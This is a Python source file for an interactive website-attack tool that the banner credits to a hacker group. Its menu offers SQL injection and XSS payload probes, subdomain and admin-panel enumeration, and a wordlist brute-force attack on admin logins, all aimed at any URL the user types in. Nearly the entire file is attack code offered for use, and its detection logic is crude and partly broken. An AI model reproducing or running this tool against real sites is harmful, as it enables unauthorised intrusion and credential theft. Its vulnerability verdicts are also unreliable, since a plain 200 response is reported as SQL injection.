import argparse
import requests
from urllib.parse import urlparse, urljoin
from termcolor import colored
import random
import os
import textwrap
import subprocess
import sys

# Function to install requirements automatically, skipping if already installed
def install_requirements():
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--no-cache-dir", "-r", "requirements.txt"])
    except subprocess.CalledProcessError as e:
        print_centered("[!] Requirements are already installed, skipping installation.")
        pass  # Skip the installation if already installed


# Function to generate random rainbow color
def rainbow_color(text):
    colors = ['red', 'yellow', 'green', 'blue', 'magenta', 'cyan']
    color = random.choice(colors)
    return colored(text, color)

# Function to center align text in terminal
def print_centered(text):
    terminal_width = os.get_terminal_size().columns
    wrapped_text = textwrap.fill(text, width=terminal_width)
    print(rainbow_color(wrapped_text))

# Function to print the main menu
def print_homepage():
    os.system('clear')  # Clears the terminal screen
    print_centered("############################################")
    print_centered("#           Author: Wincy Wastn            #")
    print_centered("#        Anonymous Vibes Bangladesh        #")
    print_centered("#       Choose an option to continue:      #")
    print_centered("############################################")
    print_centered("1. Web Vulnerability Scanner")
    print_centered("2. Subdomain Finder")
    print_centered("3. Admin Panel Finder")
    print_centered("4. Brute Force Attack (Admin Login)")
    print_centered("5. Help & Usage")
    print_centered("6. Exit")
    print_centered("############################################")

# Function to parse command line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="Advanced Website Vulnerability Scanner")
    parser.add_argument('url', help="URL of the website to scan (Include http:// or https://)")
    return parser.parse_args()

# Check for SQL Injection vulnerabilities
def check_sql_injection(url):
    payloads = ["' OR 1=1 --", '" OR 1=1 --', "' OR 'a'='a", '" OR "a"="a']
    parsed_url = urlparse(url)
    for payload in payloads:
        full_url = urljoin(url, parsed_url.path + '?' + 'param=' + payload)
        try:
            print_centered(f"[+] Checking SQL Injection: {full_url}")
            response = requests.get(full_url)
            if response.status_code == 200:
                print_centered(f"[+] Potential SQL Injection vulnerability detected at: {full_url}\n")
            else:
                print_centered(f"[-] No vulnerability found at: {full_url}\n")
        except requests.exceptions.RequestException as e:
            print_centered(f"[!] Error: {e}\n")

# Check for XSS vulnerabilities
def check_xss(url):
    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
    parsed_url = urlparse(url)
    for payload in payloads:
        full_url = urljoin(url, parsed_url.path + '?' + 'param=' + payload)
        try:
            print_centered(f"[+] Checking XSS: {full_url}")
            response = requests.get(full_url)
            if payload in response.text:
                print_centered(f"[+] Potential XSS vulnerability detected at: {full_url}\n")
            else:
                print_centered(f"[-] No vulnerability found at: {full_url}\n")
        except requests.exceptions.RequestException as e:
            print_centered(f"[!] Error: {e}\n")
            
# Subdomain Finder
def subdomain_finder(domain):
    subdomains = ["www", "dev", "staging", "test", "blog", "api", "shop"]
    print_centered("[+] Enter custom subdomains (comma separated, or leave empty to use defaults):")
    custom_subdomains = input(rainbow_color("[+] Custom subdomains: "))
    if custom_subdomains:
        subdomains.extend([subdomain.strip() for subdomain in custom_subdomains.split(",")])

    for subdomain in subdomains:
        full_url = f"http://{subdomain}.{domain}"
        try:
            print_centered(f"[+] Checking Subdomain: {full_url}")
            response = requests.get(full_url)
            if response.status_code == 200:
                print_centered(f"[+] Subdomain found: {full_url}\n")
            else:
                print_centered(f"[-] No subdomain found: {full_url}\n")
        except requests.exceptions.RequestException as e:
            print_centered(f"[!] Error: {e}\n")
            if 'Name or service not known' in str(e):
                print_centered(f"[!] The subdomain {full_url} does not exist or is unreachable.\n")
            else:
                print_centered(f"[!] There was a network error while trying to resolve {full_url}.\n")

            
# Admin Panel Finder
def admin_panel_finder(url):
    admin_paths = ['/admin', '/admin.php', '/admin/login', '/admin/dashboard', '/admin/login.php']
    print_centered("[+] Enter custom admin panel paths (comma separated, or leave empty to use defaults):")
    custom_paths = input(rainbow_color("[+] Custom paths: "))
    if custom_paths:
        admin_paths.extend([path.strip() for path in custom_paths.split(",")])

    for path in admin_paths:
        full_url = urljoin(url, path)
        try:
            print_centered(f"[+] Checking Admin Panel: {full_url}")
            response = requests.get(full_url)
            if response.status_code == 200:
                print_centered(f"[+] Admin panel found at: {full_url}\n")
            else:
                print_centered(f"[-] No admin panel found at: {full_url}\n")
        except requests.exceptions.RequestException as e:
            print_centered(f"[!] Error: {e}\n")

# Brute Force Attack (Admin Login)
def brute_force_attack(url):
    print_centered("[+] Enter custom paths for brute force attack (e.g., /admin/login):")
    custom_path = input(rainbow_color("[+] Custom path: "))
    if not os.path.exists(custom_path):
        print_centered("[!] Error: Invalid path. Try again.")
        return
    username_wordlist = input(rainbow_color("[+] Enter the custom path for username wordlist: "))
    password_wordlist = input(rainbow_color("[+] Enter the custom path for password wordlist: "))

    if not os.path.exists(username_wordlist) or not os.path.exists(password_wordlist):
        print_centered("[!] Error: Invalid file path(s). Try again.")
        return

    with open(username_wordlist, 'r') as ufile:
        usernames = ufile.readlines()

    with open(password_wordlist, 'r') as pfile:
        passwords = pfile.readlines()

    print_centered(f"[+] Starting brute force attack on {url}{custom_path}")
    
    for username in usernames:
        for password in passwords:
            username = username.strip()
            password = password.strip()
            data = {'username': username, 'password': password}
            try:
                response = requests.post(url + custom_path, data=data)
                if "Login successful" in response.text:
                    print_centered(f"[+] Brute force successful with username: {username} and password: {password}")
                    return
            except requests.exceptions.RequestException as e:
                print_centered(f"[!] Error: {e}\n")

    print_centered("[-] Brute force attack failed. No valid login credentials found.")

# Function to show help and usage
def show_help():
    print_centered("\nUsage of the tool:\n")
    print_centered("1. Web Vulnerability Scanner: This scans for SQL Injection, XSS, and other vulnerabilities.")
    print_centered("2. Subdomain Finder: Checks common subdomains like www, dev, api, etc.")
    print_centered("3. Admin Panel Finder: Finds paths like /admin, /admin.php, etc., or custom paths you provide.")
    print_centered("4. Brute Force Attack: Perform brute force attack on the admin login page with custom username and password wordlists.")
    print_centered("5. Help & Usage: Displays this help message.\n")

# Main menu function
def main():
    install_requirements()  # Installing requirements before running the tool
    try:
        while True:
            print_homepage()
            choice = input(rainbow_color("\nEnter your choice: "))

            if choice == '1':
                print_centered("\n[+] Enter website URL (e.g., http://example.com):")
                url = input(rainbow_color("[+] URL: "))
                print_centered(f"\n[+] Scanning website: {url}")
                check_sql_injection(url)
                check_xss(url)
                input(rainbow_color("[+] Press Enter to return to the homepage..."))
            elif choice == '2':
                print_centered("\n[+] Enter website domain (e.g., example.com):")
                domain = input(rainbow_color("[+] Domain: "))
                subdomain_finder(domain)
                input(rainbow_color("[+] Press Enter to return to the homepage..."))
            elif choice == '3':
                print_centered("\n[+] Enter website URL (e.g., http://example.com):")
                url = input(rainbow_color("[+] URL: "))
                admin_panel_finder(url)
                input(rainbow_color("[+] Press Enter to return to the homepage..."))
            elif choice == '4':
                print_centered("\n[+] Enter website URL (e.g., http://example.com):")
                url = input(rainbow_color("[+] URL: "))
                brute_force_attack(url)
                input(rainbow_color("[+] Press Enter to return to the homepage..."))
            elif choice == '5':
                show_help()
                input(rainbow_color("[+] Press Enter to return to the homepage..."))
            elif choice == '6':
                print_centered("\n[+] Exiting...\n")
                break
            else:
                print_centered("[!] Invalid choice. Please try again.\n")
    except KeyboardInterrupt:
        print_centered("\n[+] Exiting...\n")
        sys.exit()

if __name__ == "__main__":
    main()
